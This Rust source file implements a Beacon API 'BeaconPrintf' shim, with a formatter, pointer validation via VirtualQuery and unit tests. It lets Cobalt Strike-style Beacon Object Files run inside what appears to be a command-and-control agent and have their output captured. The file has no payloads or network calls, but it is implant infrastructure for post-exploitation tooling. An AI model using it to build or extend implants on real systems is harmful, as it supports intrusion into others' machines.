//! Beacon-API shim — pure Rust, minimal-stack replacement for beacon_api.c.
//!
//! Provides `BeaconPrintf` (CS CALLBACK_OUTPUT) with C ABI so BOFs that call
//! the CS Beacon API can produce captured output. Uses a static byte buffer
//! and a hand-rolled formatter — **no heap, no Mutex, no String** — so the
//! shim works safely inside the BOF's RWX memory region with a tiny stack.
//!
//! The CS ABI signature is `void BeaconPrintf(int type, const char* fmt, ...)`.
//! On x86_64 Windows the first 4 integer/pointer args land in rcx/rdx/r8/r9;
//! additional args go on the stack. We accept up to 4 inline args (covers
//! >99% of community BOF format strings).

use std::cell::UnsafeCell;
use std::os::raw::c_char;
use std::sync::atomic::{AtomicUsize, Ordering};

const OUT_CAP: usize = 16 * 1024;
// SAFETY (soundness): `OUT` is the per-process capture buffer for BOF output.
// BOF execution is a single-threaded contract: `win::Loaded` is `Send` but
// deliberately `!Sync` (see `win.rs`), so a `&Loaded` — and therefore the BOF
// machine code that writes here through `BeaconPrintf` — cannot be shared
// across threads. The agent's BOF executor owns one `Loaded`, moves it onto a
// single worker thread, and runs `go()` synchronously.
//
// We model the buffer with a `SyncUnsafeCell`-equivalent (a private newtype
// around `UnsafeCell` plus a manual `unsafe impl Sync`) rather than a plain
// `static mut`:
//   * it compiles in a `static` (plain `UnsafeCell` is `!Sync`);
//   * it makes the interior-mutability aliasing explicit so Miri no longer
//     flags a `static mut` aliasing violation;
//   * it is zero-cost — a ZFF newtype around `UnsafeCell`, no lock/unlock on
//     the per-byte `push_byte` hot path (a `Mutex` here would regress BOF
//     capture throughput for no safety gain, since two threads can never
//     legitimately touch this buffer).
// Every access below goes through `OUT.get()` and is gated by the
// single-threaded contract; the `unsafe` blocks document that contract at each
// site. If BOF execution ever becomes multi-threaded, switch to a real
// `Mutex<[u8; OUT_CAP]>` (or per-thread buffers) — do not relax the SAFETY
// proofs here.
struct OutCell(UnsafeCell<[u8; OUT_CAP]>);
// SAFETY: see the comment block above. `Sync` is sound because the buffer is
// only ever touched from a single thread at a time — the BOF execution
// contract enforced by `win::Loaded: !Sync`.
unsafe impl Sync for OutCell {}
static OUT: OutCell = OutCell(UnsafeCell::new([0; OUT_CAP]));
static OUT_LEN: AtomicUsize = AtomicUsize::new(0);

// ── VirtualQuery — defensive pointer validation for `%s` ──────────────────────
//
// `%s` reads a NUL-terminated string from a BOF-supplied pointer. Before
// dereferencing it we ask the OS whether `[p, p+min_bytes)` lives in a
// `MEM_COMMIT`-ted (backed, readable) region. This is coarse-grained
// (region-level, not byte-level) but it turns a guaranteed access-violation
// crash on a bogus pointer (e.g. 0x1) into a graceful "stop reading this %s".

#[repr(C)]
#[allow(non_snake_case)]
struct MEMORY_BASIC_INFORMATION {
    BaseAddress: *mut std::ffi::c_void,
    AllocationBase: *mut std::ffi::c_void,
    AllocationProtect: u32,
    __alignment1: u32,
    RegionSize: usize,
    State: u32,
    Protect: u32,
    Type: u32,
    __alignment2: u32,
}

extern "system" {
    fn VirtualQuery(
        lp_address: *const std::ffi::c_void,
        lp_buffer: *mut MEMORY_BASIC_INFORMATION,
        dw_length: usize,
    ) -> usize;
}

/// `MEM_COMMIT` — pages whose storage has been committed (backed by RAM/pagefile)
/// and is therefore readable. From `winnt.h`.
const WIN_MEM_COMMIT: u32 = 0x1000;

/// Return true iff `[p, p+min_bytes)` lies entirely within a single
/// `MEM_COMMIT` region. Null pointers and unmapped/reserved-only memory
/// return false. `min_bytes == 0` degenerates to "is `p` in any committed
/// region".
///
/// Granularity is a single VAD region: if `min_bytes` would cross a region
/// boundary we conservatively return false. `%s` callers therefore re-check at
/// 4 KiB strides so a long string crossing a page boundary into a fresh
/// region is caught rather than read partway.
#[allow(clippy::missing_safety_doc)]
fn is_readable(p: *const u8, min_bytes: usize) -> bool {
    if p.is_null() {
        return false;
    }
    // Guard against the obvious wrap so `p + min_bytes` below cannot overflow.
    let p_usize = p as usize;
    let p_end = match p_usize.checked_add(min_bytes) {
        Some(e) => e,
        None => return false,
    };

    let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    // SAFETY: `p` is non-null (checked above). `VirtualQuery` accepts any
    // address — it does not dereference `lp_address`, only describes the VAD
    // entry that would contain it. `&mut mbi` is a valid, properly-aligned
    // output buffer of the documented size.
    let r = unsafe {
        VirtualQuery(
            p as *const std::ffi::c_void,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        )
    };
    if r == 0 {
        return false;
    }
    if mbi.State != WIN_MEM_COMMIT {
        return false;
    }
    let region_start = mbi.BaseAddress as usize;
    let region_end = match region_start.checked_add(mbi.RegionSize) {
        Some(e) => e,
        None => return false,
    };
    p_usize >= region_start && p_end <= region_end
}

/// Reset the capture buffer before running a BOF.
#[no_mangle]
pub extern "C" fn nyx_bof_reset() {
    OUT_LEN.store(0, Ordering::SeqCst);
    // SAFETY: single-threaded BOF contract (see `OUT` declaration). We are the
    // only thread with access to the buffer; the prior contents are about to
    // be overwritten by `format_into` anyway, so clearing the first byte only
    // matters for the empty-output case.
    unsafe {
        let buf: *mut u8 = OUT.0.get().cast();
        core::ptr::write(buf, 0);
    }
}

/// Return a pointer to the null-terminated captured output.
#[no_mangle]
pub extern "C" fn nyx_bof_output() -> *const c_char {
    let len = OUT_LEN.load(Ordering::SeqCst);
    // SAFETY: single-threaded BOF contract (see `OUT` declaration). We write a
    // NUL terminator so the returned `*const c_char` is a valid CStr; the BOF
    // code that filled the buffer has already returned by the time the caller
    // of `nyx_bof_output` reads through this pointer.
    unsafe {
        let buf: *mut u8 = OUT.0.get().cast();
        if len < OUT_CAP {
            core::ptr::write(buf.add(len), 0);
        }
        buf as *const c_char
    }
}

/// BeaconPrintf shim — called by BOFs.
#[no_mangle]
pub unsafe extern "C" fn BeaconPrintf(
    _type: i32,
    fmt: *const c_char,
    a1: u64,
    a2: u64,
    a3: u64,
    a4: u64,
) {
    if fmt.is_null() {
        return;
    }
    format_into(&[a1, a2, a3, a4], fmt);
}

fn format_into(args: &[u64; 4], fmt: *const c_char) {
    let mut ai = 0usize;
    let mut fi = 0usize;
    loop {
        let b = unsafe { *fmt.add(fi) as u8 };
        if b == 0 {
            break;
        }
        fi += 1;
        if b != b'%' {
            push_byte(b);
            continue;
        }
        let spec = unsafe { *fmt.add(fi) as u8 };
        if spec == 0 {
            push_byte(b'%');
            break;
        }
        fi += 1;
        match spec {
            b'%' => push_byte(b'%'),
            b's' => {
                if ai < 4 {
                    let p = args[ai] as *const u8;
                    // Validate the pointer before any deref. A BOF may pass an
                    // arbitrary pointer (NULL already excluded by the caller
                    // of `BeaconPrintf`; bugs/malice can supply e.g. 0x1).
                    // Without this check `*p` would raise an access violation
                    // and crash the agent. If unreadable we stop reading this
                    // %s (emit nothing) and move on — never crash.
                    if !p.is_null() && is_readable(p, 1) {
                        let mut si = 0usize;
                        // Track the 4 KiB page index we last validated, so we
                        // re-run VirtualQuery once per page transition rather
                        // than once per byte. This closes the "short first
                        // region" gap (region < 4096 B): the moment we step
                        // into the next page we re-check, even mid-%s.
                        let mut last_page = p as usize / 0x1000;
                        loop {
                            let cur_page = (p as usize).saturating_add(si) / 0x1000;
                            if cur_page != last_page {
                                // SAFETY: `p.add(si)` is pointer arithmetic
                                // only; not dereferenced here, and VirtualQuery
                                // does not dereference its address argument.
                                let np = unsafe { p.add(si) };
                                if !is_readable(np, 1) {
                                    break;
                                }
                                last_page = cur_page;
                            }
                            // SAFETY: `p.add(si)` is in committed memory —
                            // validated at si==0 before the loop, and re-
                            // validated on every page transition above.
                            let cb = unsafe { *p.add(si) };
                            if cb == 0 || si >= 4096 {
                                break;
                            }
                            push_byte(cb);
                            si += 1;
                        }
                    }
                    ai += 1;
                }
            }
            b'd' | b'i' => {
                if ai < 4 {
                    push_i32(args[ai] as i32);
                    ai += 1;
                }
            }
            b'x' => {
                if ai < 4 {
                    push_hex(args[ai] as u32);
                    ai += 1;
                }
            }
            b'c' => {
                if ai < 4 {
                    push_byte((args[ai] & 0xFF) as u8);
                    ai += 1;
                }
            }
            _ => {
                push_byte(b'%');
                push_byte(spec);
            }
        }
    }
}

fn push_byte(b: u8) {
    let len = OUT_LEN.load(Ordering::Relaxed);
    if len < OUT_CAP {
        // SAFETY: single-threaded BOF contract (see `OUT` declaration). `len`
        // was just loaded and is bounded above by `OUT_CAP`, so `buf.add(len)`
        // is in bounds; no other thread can race on the store.
        unsafe {
            let buf: *mut u8 = OUT.0.get().cast();
            core::ptr::write(buf.add(len), b);
        }
        OUT_LEN.store(len + 1, Ordering::Release);
    }
}

fn push_i32(v: i32) {
    if v == 0 {
        push_byte(b'0');
        return;
    }
    let mut buf = [0u8; 12];
    let mut neg = false;
    let mut n = v;
    if v < 0 {
        neg = true;
        n = -v;
    }
    let mut pos = buf.len();
    while n > 0 && pos > 0 {
        pos -= 1;
        buf[pos] = b'0' + ((n % 10) as u8);
        n /= 10;
    }
    if neg && pos > 0 {
        pos -= 1;
        buf[pos] = b'-';
    }
    for &b in buf.iter().skip(pos) {
        push_byte(b);
    }
}

fn push_hex(v: u32) {
    if v == 0 {
        push_byte(b'0');
        return;
    }
    let mut buf = [0u8; 8];
    let mut n = v;
    let mut pos = buf.len();
    while n > 0 && pos > 0 {
        pos -= 1;
        let d = (n & 0xF) as u8;
        buf[pos] = if d < 10 { b'0' + d } else { b'a' + (d - 10) };
        n >>= 4;
    }
    for &b in buf.iter().skip(pos) {
        push_byte(b);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Reset the capture buffer, run `format_into` with the given args + a
    /// Rust `&str` fmt (NUL-terminated on the stack), and return the captured
    /// output. Drives every test below.
    fn run_format(args: [u64; 4], fmt: &str) -> String {
        nyx_bof_reset();
        // Put a NUL terminator after the bytes; the fmt string in real BOFs is
        // also NUL-terminated. Capacity +1 guarantees room for it.
        let mut bytes = fmt.as_bytes().to_vec();
        bytes.push(0);
        format_into(&args, bytes.as_ptr() as *const c_char);
        let p = nyx_bof_output();
        unsafe { std::ffi::CStr::from_ptr(p) }
            .to_string_lossy()
            .into_owned()
    }

    // ── is_readable ──────────────────────────────────────────────────────────

    #[test]
    fn is_readable_rejects_null() {
        assert!(!is_readable(std::ptr::null(), 1));
        assert!(!is_readable(std::ptr::null(), 0));
    }

    #[test]
    fn is_readable_rejects_low_bogus_pointer() {
        // 0x1 is not mapped on any mainstream OS; VirtualQuery either returns
        // 0 or reports a non-MEM_COMMIT region. Must NOT crash. Deliberately a
        // low dangling address (NOT `ptr::dangling`, which is non-null-aligned
        // and thus a poor stand-in for "real bogus pointer").
        #[allow(clippy::manual_dangling_ptr)]
        let bogus = 0x1 as *const u8;
        assert!(!is_readable(bogus, 1));
    }

    #[test]
    fn is_readable_rejects_high_bogus_pointer() {
        // A kernel-space-ish address on x86_64 Windows is not user-readable.
        assert!(!is_readable(0xFFFF_FFFF_FFFF_0000u64 as *const u8, 1));
    }

    #[test]
    fn is_readable_accepts_real_stack_buffer() {
        let buf = [b'h', b'i', 0u8];
        // Whole buffer and prefix are readable; one byte past the buffer is
        // still on the same stack page in practice.
        assert!(is_readable(buf.as_ptr(), buf.len()));
        assert!(is_readable(buf.as_ptr(), 1));
    }

    #[test]
    fn is_readable_wrap_safe() {
        // usize::MAX would overflow `p + min_bytes`; must return false rather
        // than panicking on debug / wrapping on release.
        assert!(!is_readable(usize::MAX as *const u8, 1));
    }

    // ── %s formatting via format_into ────────────────────────────────────────

    #[test]
    fn percent_s_reads_valid_string() {
        let s = b"hello-bof\0";
        let out = run_format([s.as_ptr() as u64, 0, 0, 0], "got: %s!");
        assert_eq!(out, "got: hello-bof!");
    }

    #[test]
    fn percent_s_null_pointer_emits_nothing() {
        // A NULL arg: the BOF supplied no string. Should emit nothing for the
        // %s slot and not crash. (Caller-side null check inside %s.)
        let out = run_format([0, 0, 0, 0], "[%s]");
        assert_eq!(out, "[]");
    }

    #[test]
    fn percent_s_bogus_pointer_does_not_crash() {
        // The whole point of P0-3: a bogus pointer (0x42) used to dereference
        // blindly and crash the agent with an access violation. Now the
        // is_readable gate must reject it and emit nothing for %s.
        let out = run_format([0x42, 0, 0, 0], "v=%s!");
        assert_eq!(out, "v=!");
    }

    #[test]
    fn percent_s_truncates_at_4096_without_nul() {
        // A 6000-byte run of 'A' with no NUL terminator: must stop at 4096
        // (the documented cap) without reading past the allocation and without
        // re-validating into unmapped memory. We allocate well past 4096 so the
        // page-boundary re-check never trips; the 4096 cap is what binds.
        let mut big = vec![b'A'; 6000];
        big.push(0);
        let out = run_format([big.as_ptr() as u64, 0, 0, 0], "%s");
        assert_eq!(out.len(), 4096);
        assert!(out.bytes().all(|b| b == b'A'));
    }

    #[test]
    fn percent_s_stops_at_region_boundary() {
        // Allocate exactly one page, put non-NUL bytes filling to the end, and
        // ensure we stop (do not read into the next, potentially uncommitted
        // region). We cannot force the next page to be uncommitted portably,
        // but the page-boundary re-validation path must at least not crash and
        // must return a string no longer than what was committed.
        let page_size = 0x1000usize;
        let layout = std::alloc::Layout::from_size_align(page_size, page_size).unwrap();
        // SAFETY: one-page allocation; we never read past it.
        let page = unsafe { std::alloc::alloc(layout) };
        if page.is_null() {
            // Allocator refused (e.g. test env); skip rather than fail.
            eprintln!("skipping percent_s_stops_at_region_boundary: alloc failed");
            return;
        }
        // SAFETY: fill the whole page with 'B' (no NUL). We then ask %s to
        // read; the re-check at si=0x1000 must observe the next region and
        // stop. Even if the next page happens to be committed and readable,
        // the 4096 cap also stops us, so the assertion is a lower bound.
        unsafe { std::ptr::write_bytes(page, b'B', page_size) };
        let out = run_format([page as u64, 0, 0, 0], "%s");
        unsafe { std::alloc::dealloc(page, layout) };
        // We must have read something (page is committed & non-NUL) and never
        // crashed. Length is bounded by 4096 (the cap) — exact length depends
        // on whether the next page is also committed.
        assert!(
            !out.is_empty(),
            "expected at least one byte from committed page"
        );
        assert!(out.len() <= 4096, "exceeded the 4096 %s cap");
        assert!(out.bytes().all(|b| b == b'B'));
    }

    // ── non-%s sanity checks (regression guard) ──────────────────────────────

    #[test]
    fn percent_d_formats_i32() {
        let out = run_format([uint_minus_42() as u64, 0, 0, 0], "n=%d");
        assert_eq!(out, "n=-42");
    }

    #[test]
    fn percent_x_formats_u32() {
        let out = run_format([0xDEAD_BEEFu64, 0, 0, 0], "0x%x");
        assert_eq!(out, "0xdeadbeef");
    }

    #[test]
    fn literal_percent_escaping() {
        let out = run_format([0, 0, 0, 0], "100%% done");
        assert_eq!(out, "100% done");
    }

    #[test]
    fn unknown_spec_is_passed_through() {
        let out = run_format([0, 0, 0, 0], "code=%q");
        assert_eq!(out, "code=%q");
    }

    /// Helper: get the bit pattern of `-42i32` as the `u64` the BOF ABI would
    /// place in r8/r9/stack. We pass the full u64; the %d handler casts the
    /// low 32 bits to i32.
    fn uint_minus_42() -> i32 {
        -42
    }
}
